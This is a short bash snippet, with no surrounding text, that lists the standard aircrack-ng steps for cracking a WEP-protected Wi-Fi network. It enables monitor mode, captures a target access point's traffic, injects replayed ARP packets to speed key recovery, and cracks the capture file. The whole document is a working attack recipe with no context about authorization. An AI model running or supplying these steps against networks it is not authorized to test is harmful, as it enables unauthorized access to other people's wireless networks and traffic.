
```bash
sudo airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng wlan0mon --bssid <AP_MAC> -c <channel> -w WEP
aireplay-ng -3 -b <AP_MAC> -h <CLIENT_MAC> wlan0mon
aircrack-ng WEP-01.cap
```



